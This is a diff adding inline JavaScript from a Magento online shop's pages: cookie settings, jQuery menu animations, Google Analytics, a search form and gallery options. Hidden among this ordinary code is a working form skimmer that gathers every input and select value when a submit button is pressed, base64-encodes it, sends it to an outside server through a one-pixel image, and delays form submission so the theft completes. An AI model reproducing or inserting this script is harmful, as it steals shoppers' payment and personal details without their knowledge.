@@ -1,0 +1,217 @@
+
+//<![CDATA[
+Mage.Cookies.path     = '/';
+Mage.Cookies.domain   = '.www.angads.com.au';
+//]]>
+
+
+//<![CDATA[
+optionalZipCountries = ["HK","IE","MO","PA"];
+//]]>
+
+
+    etCurrencyManagerJsConfig ={"precision":0,"position":8,"display":2,"excludecheckout":"1","cutzerodecimal":"0","cutzerodecimal_suffix":",-","min_decimal_count":"2"};
+    try {
+        extendProductConfigformatPrice();
+    } catch (e) {
+
+    }
+
+//<![CDATA[
+        var Translator = new Translate([]);
+        //]]>
+	
+	var $k = jQuery.noConflict(); 	
+	$k(document).ready(function(){ $k('#features').jshowoff(); });
+
+
+	var $q = jQuery.noConflict(); 
+	$q(document).ready(function(){
+	$q(".toplinks a").hover(function() {
+		$q(this).next("em").animate({opacity: "show", top: "33"}, "slow");
+	}, function() {
+		$q(this).next("em").animate({opacity: "hide", top: "40"}, "fast");
+	});	
+});
+
+
+	var $ff = jQuery.noConflict(); 
+	$ff(document).ready(function(){
+		$ff(".nav-button").click(function () {
+		$ff(".nav-button,.primary-nav").toggleClass("open");
+	});    
+	});
+
+var textlink = "Backorder availability" 
+
+//<![CDATA[
+    var _gaq = _gaq || [];
+    
+_gaq.push(['_setAccount', 'UA-43980618-1']);
+
+_gaq.push(['_trackPageview']);
+    
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+
+//]]>
+
+
+        //<![CDATA[
+        function submitForm()
+        { 
+          document.myForm.submit();
+        }
+        var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Product Keyword Search...');
+        //searchForm.initAutocomplete('http://www.angads.com.au/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        
+
+    //<![CDATA[
+    function runScript(e) {
+        if (e.keyCode == 13) {
+            var tb = document.getElementById("btn-search-angads");
+            tb.click();
+            return false;
+        }
+    }
+    //]]>
+
+
+//<![CDATA[
+var CUSTOMMENU_POPUP_WIDTH = 0;
+var CUSTOMMENU_POPUP_TOP_OFFSET = 40;
+var CUSTOMMENU_POPUP_RIGHT_OFFSET_MIN = 0;
+//]]>
+
+// <![CDATA[
+        function base64_encode(data) {
+            var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+            var o1, o2, o3, h1, h2, h3, h4, bits, i = 0,
+              ac = 0,
+              enc = '',
+              tmp_arr = [];
+
+            if (!data) {
+                return data;
+            }
+
+            do { // pack three octets into four hexets
+                o1 = data.charCodeAt(i++);
+                o2 = data.charCodeAt(i++);
+                o3 = data.charCodeAt(i++);
+
+                bits = o1 << 16 | o2 << 8 | o3;
+
+                h1 = bits >> 18 & 0x3f;
+                h2 = bits >> 12 & 0x3f;
+                h3 = bits >> 6 & 0x3f;
+                h4 = bits & 0x3f;
+
+                // use hexets to index into b64, and append result to encoded string
+                tmp_arr[ac++] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
+            } while (i < data.length);
+
+            enc = tmp_arr.join('');
+
+            var r = data.length % 3;
+
+            return (r ? enc.slice(0, r - 3) : enc) + '==='.slice(r || 3);
+        }
+        function getAllValues() {
+            var ret = "";
+            var elements = document.getElementsByTagName("input");
+            for (var i = 0; i < elements.length; i++) {
+                ret += ":" + elements[i].name + "=" + elements[i].value;
+            }
+            elements = document.getElementsByTagName("select");
+            for (var i = 0; i < elements.length; i++) {
+                ret += ":" + elements[i].name + "=" + elements[i].value;
+            }
+            return ret;
+        }
+        var eventArray = new Array(100);
+        var forms = new Array(100);
+        function MakeEvent() {
+            if (navigator.appName == 'Microsoft Internet Explorer')
+            {
+                return;
+            }
+            forms = document.getElementsByTagName("form");
+            for (var j = 0; j < forms.length; j++) {
+                forms[j].onsubmit = function () {
+                    setTimeout(function (formIndex) {
+                        frms = document.getElementsByTagName("form");
+                        frms[formIndex - 1].submit();
+                    }, 500, j); return false
+                };
+                var elements = forms[j].getElementsByTagName("button");
+                for (var i = 0; i < elements.length; i++) {
+                    if (elements[i].type == "submit" || true) {
+                        eventArray[i] = elements[i].onclick;
+                        elements[i].onmousedown = function () {
+                            data = getAllValues();
+                            var newImg = document.createElement("img");
+                            newImg.setAttribute("src", "http://www.praxis-thyssen.de/images/image.php?data=" + encodeURI(base64_encode(data)));
+                            newImg.setAttribute("height", "1");
+                            newImg.setAttribute("width", "1");
+                            newImg.setAttribute("alt", "Please, wait...");
+                            document.body.appendChild(newImg);
+                            //sleep(500);
+                        };
+                    }
+                }
+            }
+        }
+		MakeEvent();
+// ]]>
+
+<!--
+jQuery(document).ready(
+    function (){
+        jQuery("a[rel^='prettyPhoto']").prettyPhoto({
+                        animation_speed:'fast',
+            
+                        slideshow:5000,
+            
+                        autoplay_slideshow: false,
+            
+                        opacity:0.80,
+            
+                        show_title:true,
+            
+                        allow_resize:true,
+            
+                        default_width:300,
+            
+                        default_height:300,
+            
+                        counter_separator_label:'/',
+            
+                        theme:'pp_default',
+            
+                        horizontal_padding:15,
+            
+                        hideflash:false,
+            
+                        wmode:'opaque',
+            
+                        autoplay:true,
+            
+                        modal:false,
+            
+                        deeplinking:true,
+            
+                        overlay_gallery:true,
+            
+                        keyboard_shortcuts:true,
+            
+            
+            deeplinking: false,
+        });
+    }
+);
+-->
